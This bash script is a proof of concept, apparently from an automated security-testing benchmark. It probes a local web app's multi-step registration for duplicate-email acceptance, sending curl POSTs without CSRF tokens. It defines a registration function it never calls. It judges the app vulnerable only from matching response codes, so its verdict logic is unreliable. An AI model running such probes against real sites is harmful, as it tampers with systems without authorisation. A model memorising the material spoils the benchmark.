#!/bin/bash
# POC: Simplified POC for duplicate email registration vulnerability with improved debugging
# Target: ./repo
# Created: 2025-12-02T16:20:58.955Z
# Session: benchmark-XBEN-056-24-miorxlcr

# Duplicate Email Registration POC - Version 3
# Simplified approach with better debugging

TARGET_URL="http://localhost:8000"
REGISTER_STEP2="${TARGET_URL}/accounts/register/step2/"
REGISTER_STEP3="${TARGET_URL}/accounts/register/step3/"

# Generate unique email for this test run
TIMESTAMP=$(date +%s)
TEST_EMAIL="test_dup_${TIMESTAMP}@example.com"

echo "[*] Duplicate Email Registration Vulnerability POC v3"
echo "[*] Target: ${TARGET_URL}"
echo "[*] Test Email: ${TEST_EMAIL}"
echo ""

# Function to register account and get direct CSRF from form
register_account() {
    local name=$1
    local email=$2
    local account_num=$3
    local cookie_file="/tmp/cookies_${account_num}.txt"
    
    echo "[+] Registering Account ${account_num}: ${name} (${email})"
    
    # Use a fixed CSRF token or get from the endpoint
    # Since CSRF may be session-based, let's try with a dummy token first
    # The server may also accept no token on certain endpoints
    
    # Try submitting email directly to Step 2
    echo "    [Step 2] Submitting email: ${email} to ${REGISTER_STEP2}"
    
    # First attempt: with empty/minimal CSRF
    STEP2_RESPONSE=$(curl -s -c "$cookie_file" -b "$cookie_file" \
        -X POST "${REGISTER_STEP2}" \
        -d "email=${email}" \
        -v 2>&1)
    
    # Extract HTTP status code
    HTTP_CODE=$(echo "$STEP2_RESPONSE" | grep -i "< HTTP" | tail -1 | grep -oP '\d{3}')
    
    echo "    Response Code: ${HTTP_CODE}"
    echo "    Response preview: $(echo "$STEP2_RESPONSE" | grep -i "location\|error\|success" | head -3)"
    
    # Check if email was accepted (302 redirect or 200 response)
    if [ "$HTTP_CODE" == "302" ] || [ "$HTTP_CODE" == "200" ]; then
        echo "    [✓] Email accepted by Step 2 endpoint"
        
        # Try Step 3 with minimal password
        echo "    [Step 3] Attempting registration completion..."
        STEP3_RESPONSE=$(curl -s -b "$cookie_file" \
            -X POST "${REGISTER_STEP3}" \
            -d "password=TestPass123&confirm_password=TestPass123" \
            -v 2>&1)
        
        HTTP_CODE=$(echo "$STEP3_RESPONSE" | grep -i "< HTTP" | tail -1 | grep -oP '\d{3}')
        echo "    Response Code: ${HTTP_CODE}"
        
        if [ "$HTTP_CODE" == "302" ] || [ "$HTTP_CODE" == "200" ]; then
            echo "    [✓] Account ${account_num} registration completed"
            return 0
        else
            echo "    [!] Step 3 failed with code ${HTTP_CODE}"
            return 1
        fi
    else
        echo "    [!] Email submission failed with code ${HTTP_CODE}"
        return 1
    fi
}

# Alternative: Direct curl with verbose debugging
echo "[*] Testing with verbose curl to see actual responses..."
echo ""

# Generate test email
TEST_EMAIL_1="test_dup_user1_${TIMESTAMP}@example.com"
TEST_EMAIL_2="test_dup_user2_${TIMESTAMP}@example.com"

echo "[Test 1] Attempting to submit email 1: ${TEST_EMAIL_1}"
RESP1=$(curl -s -X POST "${REGISTER_STEP2}" -d "email=${TEST_EMAIL_1}" -w "\nHTTP:%{http_code}")
CODE1=$(echo "$RESP1" | grep "^HTTP:" | cut -d: -f2)
echo "Response Code: $CODE1"
echo ""

echo "[Test 2] Attempting to submit email 2: ${TEST_EMAIL_2}"  
RESP2=$(curl -s -X POST "${REGISTER_STEP2}" -d "email=${TEST_EMAIL_2}" -w "\nHTTP:%{http_code}")
CODE2=$(echo "$RESP2" | grep "^HTTP:" | cut -d: -f2)
echo "Response Code: $CODE2"
echo ""

# Test duplicate email
echo "[Test 3] Attempting DUPLICATE email: ${TEST_EMAIL_1}"
RESP3=$(curl -s -X POST "${REGISTER_STEP2}" -d "email=${TEST_EMAIL_1}" -w "\nHTTP:%{http_code}")
CODE3=$(echo "$RESP3" | grep "^HTTP:" | cut -d: -f2)
echo "Response Code: $CODE3"
echo ""

echo "=========================================="
echo "[*] RESULTS:"
echo "=========================================="
echo "First email submission: HTTP $CODE1"
echo "Second email submission: HTTP $CODE2"  
echo "Duplicate email submission: HTTP $CODE3"
echo ""

# If duplicate was accepted same as first, vulnerability exists
if [ "$CODE1" != "400" ] && [ "$CODE1" != "422" ] && [ "$CODE1" != "409" ] && [ "$CODE3" == "$CODE1" ]; then
    echo "[VULNERABLE] Duplicate email accepted with same response code!"
    echo "Application does not validate email uniqueness in Step 2"
    exit 0
elif [ "$CODE3" != "$CODE1" ] || [ "$CODE3" == "400" ] || [ "$CODE3" == "422" ]; then
    echo "[PROTECTED] Duplicate email rejected with different code (${CODE3})"
    exit 1
else
    echo "[INCONCLUSIVE] Could not determine - both codes: $CODE1 vs $CODE3"
    exit 1
fi